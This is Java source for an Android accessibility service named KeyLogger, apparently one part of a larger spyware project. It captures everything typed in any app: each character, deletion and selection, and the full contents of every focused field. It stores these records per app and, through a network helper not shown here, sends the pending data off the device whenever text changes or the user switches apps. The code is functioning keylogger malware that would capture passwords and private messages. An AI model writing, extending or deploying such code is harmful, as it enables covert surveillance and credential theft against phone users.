package com.android.inject.keystroker;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class KeyLogger extends AccessibilityService {

    private static final String TAG = "KeyLoggerSvc";
    private KeyLoggerDAO keyLoggerDAO;
    private KeyNetwork keyNetwork;
    private String currentPackage = "";
    private StringBuilder inputBuffer = new StringBuilder();
    private String currentFocusedViewId = "";
    private String previousFullText = "";
    private int currentCursorPosition = -1;
    private int selectionStart = -1;
    private int selectionEnd = -1;

    @Override
    public void onCreate() {
        super.onCreate();
        keyLoggerDAO = new KeyLoggerDAO(this);
        keyNetwork = new KeyNetwork(this);
        keyNetwork.connect();
        Log.d(TAG, "KeyLogger initialized (final).");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.isEditable()) {
                String viewId = (source.getViewIdResourceName() != null)
                    ? source.getViewIdResourceName()
                    : "unknown_view";
                if (!viewId.equals(currentFocusedViewId) && inputBuffer.length() > 0) {
                    flushBufferToDatabase();
                }
                currentFocusedViewId = viewId;
                previousFullText = "";
                currentCursorPosition = -1;
                selectionStart = -1;
                selectionEnd = -1;
                inputBuffer.setLength(0);
                CharSequence existingText = source.getText();
                if (existingText != null && existingText.length() > 0) {
                    String existStr = existingText.toString();
                    inputBuffer.append(existStr);
                    previousFullText = existStr;
                    keyLoggerDAO.insertKeystrokeEvent(currentPackage, "[FIELD_FOCUS:" + viewId + "]");
                    keyLoggerDAO.insertKeystrokeEvent(currentPackage, "[INITIAL_TEXT:" + existStr + "]");
                } else {
                    keyLoggerDAO.insertKeystrokeEvent(currentPackage, "[FIELD_FOCUS:" + viewId + "]");
                }
            }
            if (source != null) source.recycle();
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            int from = event.getFromIndex();
            int to = event.getToIndex();
            if (from != to) {
                selectionStart = from;
                selectionEnd = to;
                currentCursorPosition = to;
                String sel = "";
                if (inputBuffer.length() >= to && from >= 0) {
                    sel = inputBuffer.substring(from, Math.min(to, inputBuffer.length()));
                }
                keyLoggerDAO.insertKeystrokeEvent(currentPackage, "[SELECT:" + from + ":" + to + ":" + sel + "]");
            } else {
                int old = currentCursorPosition;
                currentCursorPosition = from;
                selectionStart = -1;
                selectionEnd = -1;
                if (old != currentCursorPosition && old >= 0) {
                    keyLoggerDAO.insertKeystrokeEvent(currentPackage, "[CURSOR_MOVE:" + old + "->" + currentCursorPosition + "]");
                }
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null && !event.getPackageName().toString().isEmpty()) {
                String pkg = event.getPackageName().toString();
                if (!pkg.equals(currentPackage)) {
                    if (inputBuffer.length() > 0) flushBufferToDatabase();
                    currentPackage = pkg;
                    keyLoggerDAO.insertAppEvent(currentPackage, getAppNameFromPackage(currentPackage));
                    if (keyNetwork != null && keyNetwork.isConnected()) keyNetwork.sendPendingData();
                }
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            boolean editable = (source != null && source.isEditable());
            if (source != null && editable) {
                int ss = source.getTextSelectionStart();
                int se = source.getTextSelectionEnd();
                if (ss >= 0) {
                    if (ss != se) { selectionStart = ss; selectionEnd = se; }
                    else { currentCursorPosition = ss; selectionStart = -1; selectionEnd = -1; }
                }
            }
            if (source != null) source.recycle();
            if (!editable) return;

            String curText = (event.getText() != null && event.getText().size() > 0) ? event.getText().get(0).toString() : "";
            String befText = (event.getBeforeText() != null && event.getBeforeText().size() > 0) ? event.getBeforeText().get(0).toString() : "";
            if (befText.isEmpty() && !previousFullText.isEmpty()) befText = previousFullText;

            processTextChange(befText, curText);
            previousFullText = curText;
            if (!inputBuffer.toString().equals(curText)) { inputBuffer.setLength(0); inputBuffer.append(curText); }
            if (keyNetwork != null && keyNetwork.isConnected()) keyNetwork.sendPendingData();
        }
    }

    private void processTextChange(String before, String after) {
        int bLen = before.length(), aLen = after.length();

        if (aLen < bLen) {
            int delCount = bLen - aLen;
            int delPos = findDeletePos(before, after);
            String deleted = before.substring(delPos, delPos + delCount);
            if (selectionStart >= 0 && selectionEnd > selectionStart && (selectionEnd - selectionStart) == delCount) {
                keyLoggerDAO.insertKeystrokeEvent(currentPackage, "[DELETE_SELECTION:" + selectionStart + ":" + selectionEnd + ":" + deleted + "]");
                selectionStart = -1; selectionEnd = -1; currentCursorPosition = delPos;
            } else if (delPos == aLen) {
                for (int i = 0; i < delCount; i++) keyLoggerDAO.insertKeystrokeEvent(currentPackage, "[BKSP_END]");
                currentCursorPosition = aLen;
            } else if (delPos < aLen) {
                keyLoggerDAO.insertKeystrokeEvent(currentPackage, "[BKSP_AT:" + (delPos + delCount) + ":" + deleted + "]");
                currentCursorPosition = delPos;
            } else {
                keyLoggerDAO.insertKeystrokeEvent(currentPackage, "[DELETE_AT:" + delPos + ":" + deleted + "]");
                currentCursorPosition = delPos;
            }
        } else if (aLen > bLen) {
            int addCount = aLen - bLen;
            int insPos = findInsertPos(before, after);
            String added = after.substring(insPos, insPos + addCount);
            if (selectionStart >= 0 && selectionEnd > selectionStart) {
                keyLoggerDAO.insertKeystrokeEvent(currentPackage, "[REPLACE_SELECTION:" + selectionStart + ":" + selectionEnd + "->" + added + "]");
                currentCursorPosition = insPos + addCount; selectionStart = -1; selectionEnd = -1;
            } else if (insPos == bLen) {
                for (char c : added.toCharArray()) keyLoggerDAO.insertKeystrokeEvent(currentPackage, classifyKey(c));
                currentCursorPosition = aLen;
            } else {
                keyLoggerDAO.insertKeystrokeEvent(currentPackage, "[CURSOR_POS:" + insPos + "]");
                for (int i = 0; i < added.length(); i++)
                    keyLoggerDAO.insertKeystrokeEvent(currentPackage, "[INSERT_AT:" + (insPos + i) + ":" + classifyKey(added.charAt(i)) + "]");
                currentCursorPosition = insPos + addCount;
            }
        } else if (aLen == bLen && !after.equals(before)) {
            int ds = findFirstDiff(before, after), de = findLastDiff(before, after);
            String oldP = before.substring(ds, de + 1), newP = after.substring(ds, de + 1);
            keyLoggerDAO.insertKeystrokeEvent(currentPackage, "[REPLACE:" + ds + ":" + oldP + "->" + newP + "]");
            currentCursorPosition = ds + newP.length();
        }
    }

    private int findDeletePos(String before, String after) {
        int left = findFirstDiff(before, after);
        int rB = before.length() - 1, rA = after.length() - 1;
        while (rB >= 0 && rA >= 0 && before.charAt(rB) == after.charAt(rA)) { rB--; rA--; }
        return (left >= after.length()) ? after.length() : left;
    }

    private int findInsertPos(String before, String after) {
        int left = findFirstDiff(before, after);
        return (left >= before.length()) ? before.length() : left;
    }

    private String classifyKey(char c) {
        switch (c) {
            case ' ': return "[SPACE]";
            case '\t': return "[TAB]";
            case '\n': case '\r': return "[ENTER]";
            case '@': return "[AT]";
            case '.': return "[DOT]";
            case '#': return "[HASH]";
            case '$': return "[DOLLAR]";
            case '%': return "[PERCENT]";
            case ',': return "[COMMA]";
            case '?': return "[QUESTION]";
            case '/': return "[SLASH]";
            case ':': return "[COLON]";
            case ';': return "[SEMICOLON]";
            case '!': return "[EXCLAMATION]";
            case '-': return "[DASH]";
            case '_': return "[UNDERSCORE]";
            case '=': return "[EQUALS]";
            case '+': return "[PLUS]";
            case '*': return "[STAR]";
            case '(': return "[LPAREN]";
            case ')': return "[RPAREN]";
            case '[': return "[LBRACKET]";
            case ']': return "[RBRACKET]";
            case '{': return "[LBRACE]";
            case '}': return "[RBRACE]";
            case '<': return "[LT]";
            case '>': return "[GT]";
            case '"': return "[QUOTE]";
            case '\'': return "[SINGLEQUOTE]";
            case '|': return "[PIPE]";
            case '\\': return "[BACKSLASH]";
            case '~': return "[TILDE]";
            case '`': return "[BACKTICK]";
            case '^': return "[CARET]";
            case '&': return "[AMPERSAND]";
            default: return String.valueOf(c);
        }
    }

    private int findFirstDiff(String a, String b) {
        int min = Math.min(a.length(), b.length());
        for (int i = 0; i < min; i++) if (a.charAt(i) != b.charAt(i)) return i;
        return min;
    }

    private int findLastDiff(String a, String b) {
        int i = a.length() - 1, j = b.length() - 1;
        while (i >= 0 && j >= 0 && a.charAt(i) == b.charAt(j)) { i--; j--; }
        return i;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            | AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
            | AccessibilityEvent.TYPE_VIEW_FOCUSED
            | AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 30;
        info.flags = AccessibilityServiceInfo.DEFAULT
            | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        setServiceInfo(info);
        Log.d(TAG, "Service connected (final).");
    }

    @Override public void onInterrupt() {}

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (inputBuffer.length() > 0) flushBufferToDatabase();
        if (keyNetwork != null) keyNetwork.disconnect();
        if (keyLoggerDAO != null) keyLoggerDAO.close();
        Log.d(TAG, "Service destroyed.");
    }

    private void flushBufferToDatabase() {
        if (inputBuffer.length() > 0) {
            keyLoggerDAO.insertKeystrokeEvent(currentPackage, "[FIELD_COMPLETE:" + inputBuffer.toString() + "]");
            inputBuffer.setLength(0); previousFullText = ""; currentCursorPosition = -1; selectionStart = -1; selectionEnd = -1;
        }
    }

    private String getAppNameFromPackage(String pkg) {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            return pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString();
        } catch (Exception e) { return pkg; }
    }
}